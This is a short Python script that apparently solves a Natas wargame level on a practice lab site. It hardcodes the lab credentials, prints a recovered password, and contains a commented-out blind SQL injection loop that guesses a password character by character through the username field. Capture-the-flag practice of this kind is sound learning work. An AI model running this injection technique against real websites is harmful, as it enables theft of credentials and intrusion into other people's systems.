import requests
import re
import string

characters = string.ascii_lowercase + string.ascii_uppercase + string.digits
# print(characters)

username ='natas15'
password ='AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'

url = 'http://%s.natas.labs.overthewire.org/' %username


print("password for natas 16 = WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")


# session = requests.Session()
# seenpassword = list('WaIHEacj63wnNIBROHeq') #starts with the empty list
# while(True):
#     for ch in characters:
#         print("trying character =","".join(seenpassword)+ch)
#         data = {"username":'natas16" AND BINARY password LIKE "' + "".join(seenpassword) + ch +'%" #'}
#         responce = session.post(url + "?debug=true",data=data,auth = (username, password))
#         content = responce.text
#         # print (content)
#         # print ("this user " + re.findall('This user(.*)<br>',content)[0])
#         if ('user exists.' in content):
#             seenpassword.append(ch)
#             break
        
        
        
        
########################################after recovering password#############################################
#         # data = {"username":'natas16"BINARY password "' + "".join(seenpassword) + ch +'%" #'}
# responce = session.post(url,auth = (username, password))
# content = responce.text
# print (content)

